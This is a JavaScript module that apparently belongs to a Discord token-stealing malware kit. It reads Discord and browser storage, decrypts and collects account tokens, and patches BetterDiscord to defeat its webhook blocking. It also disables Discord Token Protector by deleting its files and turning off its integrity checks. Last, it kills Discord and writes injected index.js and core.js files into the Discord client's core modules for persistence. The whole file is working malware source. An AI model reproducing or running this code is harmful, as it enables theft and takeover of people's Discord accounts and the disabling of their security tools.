const fs = require("fs-extra");
const rbuf = require("buffer-replace");
const { getDiscordPath } = require("../config/path");
const Util = require("./Util");
const GlobalUtil = require("../globals/GlobalUtil");
const { globSync } = require("glob");
const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
const nodePath = require("node:path");
const BrowserData = require("./BrowserData");

const injections = [
  {
    name: "index.js",
    source: require("injectIndex")
  },
  {
    name: "core.js",
    source: require("injectCore")
  }
];

class Discord {
  static async tokens() {
    const discordPaths = await getDiscordPath().catch((e) =>
      Util.report(e, [])
    );
    const tokens = [];

    for (const [bname, browser] of Object.entries(discordPaths)) {
      for (const db of browser.databases) {
        const file = await fs.readFile(db, "utf-8").catch(() => "");

        for (const line of file.split(/\r?\n/)) {
          if (bname.includes("cord")) {
            const matches = line.match(encryptedRegex);

            if (
              !fs.pathExistsSync(browser.target) ||
              !Array.isArray(matches) ||
              !matches?.length
            )
              continue;

            const key = await BrowserData.getEncryptKey(browser.target);
            const token = BrowserData.decryptValue(
              Buffer.from(matches[0].split("dQw4w9WgXcQ:")[1], "base64"),
              key
            );

            if (token) tokens.push({ token, source: bname });
          } else {
            const patterns = [
              new RegExp(/[\w]{24}\.[\w]{6}\.[\w]{40}/g),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
              new RegExp(/[\w]{26}\.[\w]{6}\.[\w]{38}/g)
            ];

            for (const p of patterns) {
              const foundTokens = line.match(p);
              if (!Array.isArray(foundTokens) || !foundTokens.length) continue;
              for (const t of foundTokens)
                tokens.push({ token: t, source: bname });
            }
          }
        }
      }
    }

    return tokens.filter(
      (val, i, self) => self.findIndex((obj) => obj.token === val.token) === i
    );
  }

  static pwnBetterDiscord() {
    const path = process.env.APPDATA + "/BetterDiscord/data/betterdiscord.asar";
    try {
      if (fs.pathExistsSync(path)) {
        const replaced = rbuf(
          fs.readFileSync(path),
          "api/webhooks",
          Date.now().toString(36)
        );

        fs.writeFileSync(path, replaced);
      }
    } catch (e) {
      Util.report(e);
    }
  }

  static pwnTokenProtector() {
    for (const file of [
      "DiscordTokenProtector.exe",
      "ProtectionPayload.dll",
      "secure.dat"
    ]) {
      const patty = process.env.LOCALAPPDATA + "\\" + file;
      if (fs.pathExistsSync(patty)) fs.removeSync(patty).catch(Util.report);
    }

    const configPath = `${process.env.LOCALAPPDATA}\\DiscordTokenProtector\\config.json`;

    if (fs.pathExistsSync(configPath)) {
      const TPConfig = Object.assign(
        GlobalUtil.toJSON(fs.readFileSync(configPath, "utf-8")),
        {
          auto_start: false,
          auto_start_discord: false,
          integrity: false,
          integrity_allowbetterdiscord: false,
          integrity_checkexecutable: false,
          integrity_checkhash: false,
          integrity_checkmodule: false,
          integrity_checkscripts: false,
          integrity_checkresource: false,
          integrity_redownloadhashes: false,
          iterations_iv: 0,
          iterations_key: 0,
          version: 0
        }
      );

      fs.writeFileSync(configPath, JSON.stringify(TPConfig, null, 4));
    }

    return true;
  }

  static extractPaths() {
    const discordApps = fs
      .readdirSync(process.env.LOCALAPPDATA)
      .filter((file) => file.endsWith("cord"));

    const targetPaths = discordApps
      .map((app) => {
        const patty = `${process.env.LOCALAPPDATA}/${app}/app-*/modules/discord_desktop_core-*/discord_desktop_core`;
        const pattern = nodePath.resolve(patty).replaceAll("\\", "/");

        return globSync(pattern)[0];
      })
      .filter(Boolean);

    return { discordApps, targetPaths };
  }

  static async inject() {
    Discord.pwnBetterDiscord();
    Discord.pwnTokenProtector();
    const { discordApps, targetPaths } = Discord.extractPaths();

    const tasklist = await Util.exec("tasklist");
    const tasks = tasklist.toLowerCase();

    for (const app of discordApps) {
      const exe = app + ".exe";
      if (tasks.includes(exe.toLowerCase())) await Util.killExe(exe);
    }

    for (const inject of injections) {
      for (const target of targetPaths) {
        await fs
          .writeFile(
            nodePath.resolve(`${target}/${inject.name}`),
            inject.source
          )
          .catch(Util.report);
      }
    }

    return true;
  }
}

module.exports = Discord;
